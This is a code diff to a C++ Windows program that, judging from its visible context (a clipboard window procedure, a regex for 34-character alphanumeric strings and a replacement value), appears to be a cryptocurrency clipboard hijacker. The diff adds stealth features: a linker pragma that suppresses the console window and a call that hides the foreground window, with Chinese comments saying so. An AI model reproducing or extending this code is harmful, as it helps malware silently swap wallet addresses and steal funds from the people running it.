@@ -6,6 +6,10 @@
 //aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 //bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
 
+//隐藏DOS黑窗口
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+
+
 std::string REPLACCE_VAL = "1234567890123456789012345678901234";
 std::regex REGEX_VAL("[0-9a-zA-Z]{34}");
 
@@ -84,6 +88,8 @@ LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+    // 隱藏主窗口
+    ShowWindow(GetForegroundWindow(), 0);
     WNDCLASSEX wndClass = { sizeof(WNDCLASSEX) };
     wndClass.lpfnWndProc = ClipWndProc;
     wndClass.lpszClassName = L"ClipWnd";
